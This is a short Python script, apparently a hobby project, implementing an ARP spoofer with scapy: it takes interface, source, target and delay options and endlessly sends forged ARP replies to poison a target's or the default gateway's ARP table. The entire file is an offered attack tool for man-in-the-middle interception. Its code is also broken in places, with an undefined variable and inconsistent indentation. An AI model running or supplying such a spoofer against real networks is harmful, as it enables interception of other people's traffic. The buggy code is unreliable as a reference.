#!/usr/local/bin/env python
import sys
from scapy.all import *
#jast for the parameters
from optparse import OptionParser 

#jast for the network data
import socket
import os

def show_usage():
	print(''' arpspoofer usage: ArpSpoofer.py [-h] [-i IFACE] [-s SRC] [-d DELAY] [-gw]
	-t TARGET
	Spoof ARP tables
	optional arguments:
	-h, --help
	show this help message and exit
	-i IFACE, --iface IFACE
	Interface you wish to use
	-s SRC, --src SRC
	The address you want for the attacker
	-d DELAY, --delay DELAY
	Delay (in seconds) between messages
	-gw
	should GW be attacked as well
	-t TARGET, --target TARGET
	IP of target ''')
	sys.exit()

if __name__=='__main__':
	if len(sys.argv)<2:	
		show_usage()

#get parameter
	#global
	interface="eth0"
	delay=0
	getWay=os.popen("ip route|grep 'default'|awk '{print $3}'").read()
	
	opt=OptionParser(add_help_option=False,epilog="Arpspoofer!")
	opt.add_option("-h","--help",dest="help",action='store_true',help="help you")
	opt.add_option("-i","--interface",dest="interface",help="chose interface")
	opt.add_option("-s","--sorce",dest="sorce",help="Attaker sorce ip add") 
	opt.add_option("-t","--target",dest="target",help="ip of target. default= default gateway") 
	opt.add_option("-d","--delay",dest="delay",help="delay betwin Arp-packets sending")
        #opt.add_option("-gw","--getway",dest="gwYoN",help="shuld getway be attacked as well. Y for yes")
	op, args=opt.parse_args()
	
	if op.help:
		show_usage()
	if op.interface is not None:
		interface=op.interface
	
	if op.sorce is not None:
                Sorce=op.sorce
        else:
		Sorce=socket.gethostbyname(socket.gethostname()) #this host IP address
	if op.target is not None:
		Target=target
	else:
		Target=getWay

	if op.delay is not None:
		delay=op.delay
      #bild & send packet
        
	packet=ARP(op=2,pdst=Target,psrc=Sorce)
			
	while True:
		send(packet)
		time.sleep(float(delay))

########################


  




